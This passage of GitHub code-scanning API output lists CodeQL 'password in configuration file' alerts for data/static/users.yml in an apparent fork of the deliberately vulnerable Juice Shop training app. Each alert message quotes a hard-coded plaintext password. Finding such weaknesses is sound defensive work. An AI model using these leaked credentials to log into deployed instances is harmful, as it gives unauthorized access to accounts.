[CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'y&x5Z#f6W532ZUf$q3DsdgfgfgxxUsvoCUaDzFU' in configuration file."},"location":{"path":"data/static/users.yml","start_line":243,"end_line":243,"start_column":13,"end_column":54},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/110/instances","dismissal_approved_by":null},{"number":109,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/109","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/109","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'y&x5Z#f6W532Z4445#Ae2HkwZVyDb7&oCUaDzFU' in configuration file."},"location":{"path":"data/static/users.yml","start_line":237,"end_line":237,"start_column":13,"end_column":54},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/109/instances","dismissal_approved_by":null},{"number":108,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/108","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/108","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'demo' in configuration file."},"location":{"path":"data/static/users.yml","start_line":213,"end_line":213,"start_column":13,"end_column":19},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/108/instances","dismissal_approved_by":null},{"number":107,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/107","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/107","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'muda-muda > ora-ora' in configuration file."},"location":{"path":"data/static/users.yml","start_line":204,"end_line":204,"start_column":13,"end_column":34},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/107/instances","dismissal_approved_by":null},{"number":106,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/106","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/106","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'i am an awesome accountant' in configuration file."},"location":{"path":"data/static/users.yml","start_line":195,"end_line":195,"start_column":13,"end_column":41},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/106/instances","dismissal_approved_by":null},{"number":105,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/105","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/105","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'uss enterprise' in configuration file."},"location":{"path":"data/static/users.yml","start_line":186,"end_line":186,"start_column":13,"end_column":29},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/105/instances","dismissal_approved_by":null},{"number":104,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/104","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/104","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'K1f.....................' in configuration file."},"location":{"path":"data/static/users.yml","start_line":158,"end_line":158,"start_column":13,"end_column":39},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/104/instances","dismissal_approved_by":null},{"number":103,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/103","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/103","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'EinBelegtesBrotMitSchinkenSCHINKEN!' in configuration file."},"location":{"path":"data/static/users.yml","start_line":149,"end_line":149,"start_column":13,"end_column":50},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/103/instances","dismissal_approved_by":null},{"number":102,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/102","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/102","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password '0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB' in configuration file."},"location":{"path":"data/static/users.yml","start_line":140,"end_line":140,"start_column":13,"end_column":45},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/102/instances","dismissal_approved_by":null},{"number":101,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/101","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/101","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'Mr. N00dles' in configuration file."},"location":{"path":"data/static/users.yml","start_line":132,"end_line":132,"start_column":13,"end_column":26},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/101/instances","dismissal_approved_by":null},{"number":100,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/100","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/100","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'focusOnScienceMorty!focusOnScience' in configuration file."},"location":{"path":"data/static/users.yml","start_line":123,"end_line":123,"start_column":13,"end_column":49},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/100/instances","dismissal_approved_by":null},{"number":99,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/99","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/99","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P' in configuration file."},"location":{"path":"data/static/users.yml","start_line":115,"end_line":115,"start_column":13,"end_column":45},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/99/instances","dismissal_approved_by":null},{"number":98,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/98","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/98","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb' in configuration file."},"location":{"path":"data/static/users.yml","start_line":107,"end_line":107,"start_column":13,"end_column":75},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/98/instances","dismissal_approved_by":null},{"number":97,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-02-05T07:56:25Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/97","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/97","state":"dismissed","fixed_at":null,"dismissed_by":{"login":"anubhav2025","id":115610428,"node_id":"U_kgDOBuQTPA","avatar_url":"https://avatars.githubusercontent.com/u/115610428?v=4","gravatar_id":"","url":"https://api.github.com/users/anubhav2025","html_url":"https://github.com/anubhav2025","followers_url":"https://api.github.com/users/anubhav2025/followers","following_url":"https://api.github.com/users/anubhav2025/following{/other_user}","gists_url":"https://api.github.com/users/anubhav2025/gists{/gist_id}","starred_url":"https://api.github.com/users/anubhav2025/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/anubhav2025/subscriptions","organizations_url":"https://api.github.com/users/anubhav2025/orgs","repos_url":"https://api.github.com/users/anubhav2025/repos","events_url":"https://api.github.com/users/anubhav2025/events{/privacy}","received_events_url":"https://api.github.com/users/anubhav2025/received_events","type":"User","user_view_type":"public","site_admin":false},"dismissed_at":"2025-02-05T07:56:25Z","dismissed_reason":"false positive","dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"dismissed","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' in configuration file."},"location":{"path":"data/static/users.yml","start_line":88,"end_line":88,"start_column":13,"end_column":51},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/97/instances","dismissal_approved_by":null},{"number":96,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-02-05T07:42:10Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/96","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/96","state":"dismissed","fixed_at":null,"dismissed_by":{"login":"anubhav2025","id":115610428,"node_id":"U_kgDOBuQTPA","avatar_url":"https://avatars.githubusercontent.com/u/115610428?v=4","gravatar_id":"","url":"https://api.github.com/users/anubhav2025","html_url":"https://github.com/anubhav2025","followers_url":"https://api.github.com/users/anubhav2025/followers","following_url":"https://api.github.com/users/anubhav2025/following{/other_user}","gists_url":"https://api.github.com/users/anubhav2025/gists{/gist_id}","starred_url":"https://api.github.com/users/anubhav2025/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/anubhav2025/subscriptions","organizations_url":"https://api.github.com/users/anubhav2025/orgs","repos_url":"https://api.github.com/users/anubhav2025/repos","events_url":"https://api.github.com/users/anubhav2025/events{/privacy}","received_events_url":"https://api.github.com/users/anubhav2025/received_events","type":"User","user_view_type":"public","site_admin":false},"dismissed_at":"2025-02-05T07:42:10Z","dismissed_reason":"false positive","dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"dismissed","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'OhG0dPlease1nsertLiquor!' in configuration file."},"location":{"path":"data/static/users.yml","start_line":63,"end_line":63,"start_column":13,"end_column":39},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/96/instances","dismissal_approved_by":null},{"number":95,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-02-05T07:34:43Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/95","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/95","state":"dismissed","fixed_at":null,"dismissed_by":{"login":"anubhav2025","id":115610428,"node_id":"U_kgDOBuQTPA","avatar_url":"https://avatars.githubusercontent.com/u/115610428?v=4","gravatar_id":"","url":"https://api.github.com/users/anubhav2025","html_url":"https://github.com/anubhav2025","followers_url":"https://api.github.com/users/anubhav2025/followers","following_url":"https://api.github.com/users/anubhav2025/following{/other_user}","gists_url":"https://api.github.com/users/anubhav2025/gists{/gist_id}","starred_url":"https://api.github.com/users/anubhav2025/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/anubhav2025/subscriptions","organizations_url":"https://api.github.com/users/anubhav2025/orgs","repos_url":"https://api.github.com/users/anubhav2025/repos","events_url":"https://api.github.com/users/anubhav2025/events{/privacy}","received_events_url":"https://api.github.com/users/anubhav2025/received_events","type":"User","user_view_type":"public","site_admin":false},"dismissed_at":"2025-02-05T07:34:43Z","dismissed_reason":"false positive","dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration 